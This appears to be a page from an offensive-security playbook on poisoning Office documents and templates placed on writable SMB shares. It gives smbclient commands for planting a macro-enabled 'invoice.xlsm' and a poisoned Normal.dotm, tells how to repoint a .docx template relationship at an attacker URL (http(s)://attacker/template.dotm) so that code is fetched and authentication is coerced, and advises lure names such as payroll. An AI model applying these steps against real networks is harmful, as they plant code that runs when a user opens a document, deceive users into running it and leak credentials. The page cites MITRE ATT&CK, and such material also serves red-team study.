---
title: "Office and template poisoning: execution when a user opens a document"
order: 2
description: "Office documents on a writable share execute attacker content when a user opens them: macro-enabled documents run their VBA, and the global and workgroup templates (Normal.dotm, startup folders) run on every launch. Remote-template and external-reference injection additionally pulls attacker content from a server when a benign-looking document opens."
keywords:
  - macro
  - normal.dotm
  - remote template
  - office poisoning
  - startup templates
---

# Office and template poisoning

Office documents stored on a writable share become execution triggers when users open them. The direct form is a macro-enabled document whose VBA runs on open (subject to the user's macro settings). The more insidious form targets templates: Word's `Normal.dotm` and the Office startup folders hold code and settings loaded on every launch, so poisoning a shared or roaming template runs on each start. And remote-template or external-reference injection makes an otherwise clean document fetch and execute attacker content from a server when it opens, which also coerces authentication.

## Routes

```bash
# 1. macro document on the share (runs VBA on open if macros are allowed)
smbclient //<t>/share -U 'user%pass' -c 'put invoice.xlsm'
# 2. poison a shared/roaming template so code runs on every Office launch
#    Normal.dotm (Word), or files in the Office STARTUP folder, if share-hosted
smbclient //<t>/profiles -U 'user%pass' -c 'cd Templates; put Normal.dotm'
# 3. remote-template injection: a .docx references an external template URL the
#    attacker controls; opening the doc fetches template.dotm (code + auth)
#    edit word/_rels/settings.xml.rels Target to http(s)://attacker/template.dotm
```

Remote-template injection works because an Office Open XML document records the template it is based on as a relationship target; changing that target to an attacker URL makes the client fetch the remote template on open, which can carry a macro and forces the client to request the URL (leaking or relaying authentication if it is UNC/HTTP).

## Exploitation notes

- Macro execution depends on the user's macro policy; template poisoning (`Normal.dotm`, STARTUP) is stronger where those are share-hosted because it runs on every launch regardless of per-document prompts.
- Remote-template injection doubles as coercion: a UNC or HTTP template target makes the client authenticate to the attacker, combining with [signing and relay](../signing-and-relay.md).
- Name the poisoned document to invite opening (invoice, report, payroll) and place it where the target user works; execution is in that user's context.
- This triggers on open rather than on folder browse; use [SCF and LNK coercion](scf-and-lnk-coercion.md) for the browse-only case.

## References

- [MITRE ATT&CK: template injection](https://attack.mitre.org/techniques/T1221/)
- [MITRE ATT&CK: office application startup](https://attack.mitre.org/techniques/T1137/)
